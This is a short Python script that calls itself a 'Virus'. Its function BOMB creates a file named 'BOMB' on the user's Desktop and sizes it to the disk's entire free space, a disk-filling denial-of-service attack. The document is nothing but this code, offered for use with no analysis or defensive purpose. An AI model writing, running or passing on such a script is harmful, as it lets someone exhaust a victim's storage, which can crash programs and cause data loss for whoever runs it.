import os
import shutil

def BOMB(): 
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

    file_name = "BOMB"
    file_path = os.path.join(desktop_path, file_name)

    free_space = shutil.disk_usage(desktop_path).free

    try:
        with open(file_path, "wb") as f:
            f.seek(free_space - 1)
            f.write(b'\0')

        print(f"Virus '{file_name}' Created: {free_space / (1024 ** 2):.2f} MB")
    except Exception as e:
        print(f"Something went wrong: {e}")

if __name__ == "__main__":
    BOMB()
